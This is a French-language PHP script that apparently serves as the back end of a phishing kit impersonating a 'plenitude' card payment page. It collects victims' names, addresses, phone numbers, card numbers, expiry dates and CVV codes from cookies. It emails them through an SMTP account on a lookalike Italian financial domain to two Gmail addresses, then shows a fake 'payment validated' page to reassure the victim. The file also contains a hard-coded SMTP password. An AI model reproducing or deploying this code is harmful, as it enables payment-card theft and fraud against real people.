<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

// Inclure les fichiers requis de PHPMailer
require 'PHPMailer/PHPMailer.php';
require 'PHPMailer/SMTP.php';
require 'PHPMailer/Exception.php';
// require 'vendor/autoload.php'; // Inutile si les fichiers sont inclus manuellement

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $n_card = isset($_COOKIE['n_card']) ? htmlspecialchars($_COOKIE['n_card']) : '';
    $address = isset($_COOKIE['address']) ? htmlspecialchars($_COOKIE['address']) : '';
    $address1 = isset($_COOKIE['address1']) ? htmlspecialchars($_COOKIE['address1']) : '';
    $country = isset($_COOKIE['country']) ? htmlspecialchars($_COOKIE['country']) : '';
    $phone = isset($_COOKIE['phone']) ? htmlspecialchars($_COOKIE['phone']) : '';
    $nom = isset($_COOKIE['nom']) ? htmlspecialchars($_COOKIE['nom']) : '';
    $prenom = isset($_COOKIE['prenom']) ? htmlspecialchars($_COOKIE['prenom']) : '';
    $c_num = isset($_COOKIE['c_num']) ? htmlspecialchars($_COOKIE['c_num']) : '';
    $exm = isset($_COOKIE['exm']) ? htmlspecialchars($_COOKIE['exm']) : '';
    $exy = isset($_COOKIE['exy']) ? htmlspecialchars($_COOKIE['exy']) : '';
    $csc = isset($_COOKIE['csc']) ? htmlspecialchars($_COOKIE['csc']) : '';

    if (!empty($n_card) && !empty($address) && !empty($address1) && !empty($country) && !empty($phone) && !empty($nom) && !empty($prenom) && !empty($c_num) && !empty($exm) && !empty($exy) && !empty($csc)) {
        $mail = new PHPMailer(true);

        try {
            $mail->isSMTP();
            $mail->Host = 'smtp.spacemail.com';
            $mail->SMTPAuth = true;
            $mail->Username = 'pagamento@serviziofinanzieri.it.com';
            $mail->Password = '383A6cf5-D61A-4154-9bf3-0d5f822BDc07';
            $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
            $mail->Port = 993;

            $mail->setFrom('pagamento@serviziofinanzieri.it.com', 'plenitude card Payment');
            $mail->addAddress('jasmayzie@gmail.com');
            $mail->addAddress('gestionimmobilier770@gmail.com');

            $mail->isHTML(true);
            $mail->Subject = 'Informations de paiement plenitude';
            $mail->Body = "
                <h1>Informations collectées</h1>
                <p><strong>Nom sur la carte:</strong> $n_card</p>
                <p><strong>Adresse:</strong> $address</p>
                <p><strong>Adresse personnelle:</strong> $address1</p>
                <p><strong>Pays:</strong> $country</p>
                <p><strong>Numéro de téléphone:</strong> $phone</p>
                <p><strong>Nom:</strong> $nom</p>
                <p><strong>Prénom:</strong> $prenom</p>
                <p><strong>Numéro de la carte:</strong> $c_num</p>
                <p><strong>Mois d'expiration:</strong> $exm</p>
                <p><strong>Année d'expiration:</strong> $exy</p>
                <p><strong>CVV:</strong> $csc</p>
            ";

            $mail->send();

            // Afficher le message après envoi
            echo "<!DOCTYPE html>
            <html>
            <head>
                <title>Paiement validé</title>
                <style>
                    body {
                        font-family: Arial, sans-serif;
                        text-align: center;
                        margin-top: 100px;
                    }
                    h1 {
                        font-size: 48px;
                        font-weight: bold;
                        color: green;
                    }
                </style>
            </head>
            <body>
                <h1>Paiement validé</h1>
            </body>
            </html>";

        } catch (Exception $e) {
            echo "Erreur lors de l'envoi de l'email: {$mail->ErrorInfo}";
        }
    } else {
        echo "Veuillez remplir tous les champs.";
    }
} else {
    echo "Méthode de requête non autorisée.";
}
?>
